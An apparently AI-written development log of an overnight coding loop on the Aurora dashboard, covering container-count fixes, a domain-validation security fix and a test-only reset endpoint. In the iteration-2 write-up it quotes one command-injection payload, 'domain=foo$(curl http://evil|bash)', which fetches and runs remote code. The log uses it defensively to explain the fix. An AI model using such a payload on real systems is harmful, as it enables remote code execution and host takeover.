# Ralph overnight v0.2 close-out + v0.3 groundwork — evidence log

Baseline commit: `f9c4406` on `rename/aurora`. Isolated worktree at `/home/bruce/aurora-v02-wt` on branch `feat/v0.2-overnight`. Task spec: `RALPH_TASK_V02_V03.md`.

Live aurora on :8090 must not be rebuilt or restarted from this worktree. Sibling async worker `3707d3d3` completed on `rename/aurora` (login-flow polish + 3-layer security review) before this loop began.

## Iter 1 · 2026-08-02 22:35 · commit d9c4b6d
**A1** — DoneChecklist/PackagesCard drift on `notes` + honest container count.

### Root cause (two symptoms, one class of bug)

- `DockerService.listProjectContainers()` matched `com.docker.compose.project=aurora` only. Aurora launches package stacks with different project names:
  - `silverbullet` (notes) → `project=aurora` (shared, historical)
  - `aurora` (dashboard) → `project=aurora-dashboard`
  - `caddy` (core) → `project=aurora-core`
  - media/privacy/etc. → `project=aurora-<pkg>`
  Only the first was visible, so the System card's `Containers 1` was actually correct-under-the-filter but wrong-in-intent.
- `packages/notes/manifest.yml` had no `probe:` block, so `StatusProbeService.probe("notes")` defaulted `container = pkg = "notes"`. `findByName("notes")` returned empty (real container is `silverbullet`), so the DoneChecklist reported not-started. PackagesCard uses `runningPackageNames()` which parses `com.docker.compose.project.config_files` → `/packages/notes/` → `notes`, correctly reporting running.

### Fix

- `packages/notes/manifest.yml`: added `probe: {kind: docker, container: silverbullet, external_url: "http://notes.{domain}/"}`.
- `DockerService`: broadened label filter to accept `aurora` OR `aurora-*`. Docker's label filter API has no prefix support, so I post-filter in Java. Cheap.
- `DockerServiceTests` (new, 5 assertions): shared-project match, aurora-* prefix match, unrelated-project exclusion, null-label tolerance, no-project-label tolerance.
- `StatusProbeServiceTests` (+2 assertions): notes uses silverbullet and returns running; notes returns not-started when silverbullet is absent.

### Verification

- `mvn -o test -Dtest='DockerServiceTests,StatusProbeServiceTests'` → **25/25 green** (via `maven:3.9-eclipse-temurin-25-alpine` bind-mount; no local JDK).
- Full backend suite: **106 tests, 1 failure, 0 introduced.** Verified the failure is pre-existing at baseline `f9c4406` by `git stash + re-run + git stash pop`: `PackagesServiceTests.parsesFakeRepoManifests` asserts `media.enabled()` but `.state.yml` is not seeded in `src/test/resources/fake-repo/`. Not in A1 scope, deferred to a later iteration.

### Files touched
- `packages/notes/manifest.yml` (+11)
- `packages/dashboard/backend/src/main/java/com/tomaytotomato/aurora/services/DockerService.java` (+38 -5)
- `packages/dashboard/backend/src/test/java/com/tomaytotomato/aurora/services/DockerServiceTests.java` (+130, new)
- `packages/dashboard/backend/src/test/java/com/tomaytotomato/aurora/services/StatusProbeServiceTests.java` (+33)

### Not touched, deferred (out of A1 scope)
- Frontend: DoneChecklist and PackagesCard consume the wire honestly; the fix lands entirely backend-side so no frontend churn. No new E2E asserted the wire delta because the aurora-e2e project is not runnable from this worktree (Playwright infra is on `rename/aurora`). Note added: next iter can add an E2E stubbing `/api/services/status` with `{package: 'notes', state: 'running'}` and asserting the checklist row.
- Pre-existing failure `PackagesServiceTests.parsesFakeRepoManifests` — needs a `.state.yml` seed in fake-repo (via `@BeforeAll` or a test resource). Tracked as follow-up.

### Next iteration target
A2 — validate `enabled_packages` names on `PATCH /api/onboarding` ingress (reviewer P1). Baseline test count grows by ≥2 (regex-fail + unknown-package).

## Iter 2 · 2026-08-02 22:58 · commit 9bf17e8
**A2 investigation → pivot to B-1 (HIGH) from the async security review.**

### A2 status: already done

Investigation showed `enabled_packages` ingress validation is fully covered at HEAD:
- `OnboardingController.patch` catches `PackageNameValidator.InvalidPackageNamesException` and returns 400 with structured `{error, message, invalid, unknown}`.
- `PackageNameValidator.validate(names)` — regex shape check + on-disk existence check (`packages/<name>/` must exist).
- Called from `OnboardingService.setEnabledPackages(enabled)` before any state-write.
- 11 assertions in `PackageNameValidatorTests` + 2 in `OnboardingControllerPatchTests` cover the accept/reject/shape/unknown-package matrix.

The reviewer's B-8 positive observation confirms it. So A2 is closed by prior work; log entry noted, moving on.

### Pivot: B-1 (HIGH) closed

Same class of bug (ingress validation on `PATCH /api/onboarding`), higher severity. Reviewer's full report at `/home/bruce/.pi-subagents/artifacts/outputs/3707d3d3-de5b-402e-837d-24b252ea14c4/logs/async-security-review.md`.

**Attack:** unauth PATCH `domain=foo$(curl http://evil|bash)` in the (admin-created → complete=false) window → `packages/core/.env` gains a literal line `DOMAIN=foo$(...)` → next `up.sh` run sources with `. "$ef"` → bash evaluates `$(...)` → host RCE as UID 1000 with docker.sock RW (O-1) === root.

**Fix:** three defense-in-depth layers, (a) and (b) landed here, (c) tracked as follow-up.

1. `OnboardingService.DOMAIN_PATTERN` — strict RFC-1123-ish regex. Two labels min, `[a-z0-9-]` per label, no leading/trailing hyphen, ≤ 253 total.
2. `OnboardingService.quoteForBash()` — single-quote-escape at `.env` write. The classic `'\''` trick. Belt-and-braces with (a).
3. Deferred to a later iter: replace `. "$ef"` in `scripts/up.sh` with `docker compose --env-file` (parses `KEY=VALUE` as literal, no shell eval).

### Verification

- `mvn -o test -Dtest='OnboardingDomainValidationTests'` → **21/21 green.**
- Full backend suite: **127 tests, 1 pre-existing failure, 0 introduced** (up from 106 at iter-1 baseline).
- Verified the failure is still `PackagesServiceTests.parsesFakeRepoManifests` — unchanged from iter 1.

### Files touched
- `packages/dashboard/backend/src/main/java/com/tomaytotomato/aurora/services/OnboardingService.java` (+31 -4): `DOMAIN_PATTERN`, `quoteForBash`, tightened `setDomain` + `upsertCoreEnvDomain`.
- `packages/dashboard/backend/src/test/java/com/tomaytotomato/aurora/services/OnboardingDomainValidationTests.java` (+189, new): 21 assertions covering accept, B-1 exploit strings, shape violations, and the quoter contract.

### Not touched, deferred (out of iter-2 scope)
- B-1 layer (c): `up.sh` refactor to `docker compose --env-file`. Larger change touching bash + tests + probably a fixture.
- B-1 layer (d): Origin/Referer check on unauth mutating endpoints. Session-independent, worth doing but orthogonal.
- Other reviewer findings tracked in the iter-2 commit body (B-2/B-3/B-4/F-1, O-1/O-2/O-3).

### Next iteration target
A3 — scrub SSH copy from `OnboardingAdmin.vue` (reviewer P1). Security review noted the SSH-copy line is not present at HEAD, but I'll re-verify + close the task file item honestly. If truly clean, iter 3 pivots to A4 (TD5 wizard-reset endpoint).

## Iter 3 · 2026-08-02 23:20 · commit (see git log)
**A3 closed by inspection; landed A4 (TD5) in same iter.**

### A3 status: false alarm (as reviewer flagged)

Read `views/onboarding/OnboardingAdmin.vue` in full. Zero references to `ssh`, `SSH`, `scp`, `bootstrap.sh`, `./scripts/`, or `sudo`. Lines 120/141 are password-recovery buttons; nothing SSH-shaped. Reviewer's F-2 note stands: the copy-to-clipboard fallback in `lib/utils.ts` briefly attaches a `<textarea>` with the admin password (accepted risk; password already lives in the reactive store). Closed with no code change.

### A4 (TD5 wizard-reset endpoint) shipped

Unblocks the 10+ E2E reds noted in `MORNING_BRIEFING_3.md` §9. Full stack in one commit because the pieces have no honest split: repo delete methods, service orchestration, controller gate, env wiring, and spec `beforeEach` all move together.

**Layers, in order:**

1. `AdminUserRepo.deleteAll()` — `DELETE FROM admin_user`. Sessions naturally lose auth on next `/api/auth/me`.
2. `SettingsRepo.delete(key)` — single-row delete for `onboarding.*` cursor keys.
3. `StateFileService.deleteState()` — `Files.deleteIfExists` on `.state.yml` + `.state.yml.tmp` (catches interrupted atomic write).
4. `OnboardingService.reset()` — orchestrates 1+2+3 in order (admin wipe first so a mid-request observer sees 401 before it sees torn wizard state). Audit-records the event.
5. `OnboardingController.reset()` — `POST /api/onboarding/reset`. `@Value("${aurora.e2e-mode:false}")` gate; returns 404 when off (endpoint hidden). No `guardMidOnboarding()` — the point is to blow away the state that guard enforces.
6. `application.yml` — `aurora.e2e-mode: ${AURORA_E2E:false}`. Prod false; aurora-e2e compose flips on via env.
7. `e2e/scripts/compose.e2e.yml` — `environment.AURORA_E2E: '1'` on the aurora service only.
8. Three E2E specs — `test.beforeEach` hits `POST /api/onboarding/reset`. `.catch(() => {})` swallows the 404 from a prod-facing spec run.

### Verification

- `mvn -o test -Dtest='OnboardingControllerResetTests,OnboardingServiceResetTests'` → **6/6 green.**
- Full backend suite: **133 tests, 1 pre-existing failure, 0 introduced.** (127 → 133, +6.)
- E2E: typechecks locally against the fixture shape; specs not exercised (aurora-e2e project boot is outside this worktree). Verification deferred to Bruce's morning `bash scripts/verify-iter3.sh VERIFY_E2E=1`.

### Files touched
- Backend (main): `OnboardingController.java` (+33), `AdminUserRepo.java` (+10), `SettingsRepo.java` (+9), `OnboardingService.java` (+32), `StateFileService.java` (+16), `application.yml` (+6).
- Backend (test): `OnboardingControllerResetTests.java` (+90, new), `OnboardingServiceResetTests.java` (+106, new).
- E2E: `compose.e2e.yml` (+5), `wizard-happy-path.spec.ts` (+7 -1), `no-cli-instructions.spec.ts` (+8), `done-launch.spec.ts` (+6).

### Not touched, deferred
- Run the aurora-e2e project + verify the E2E baseline pass count grows (target ≥72, was 62). Bruce's morning verify sweep.
- The reviewer's B-1 layer (c) `up.sh` refactor from `. "$ef"` to `docker compose --env-file` — still open, tracked as follow-up.

### Next iteration target
A5 — TD1 SSE for `/api/services/status`. Same `SseEmitter` pattern as `EventsController`. Frontend composable `useServiceStatusStream.ts` with poll fallback. Backend unit test with `MockMvc` async support. This drops the 5s poll cliff and is the last high-value v0.2 close-out before Phase B.
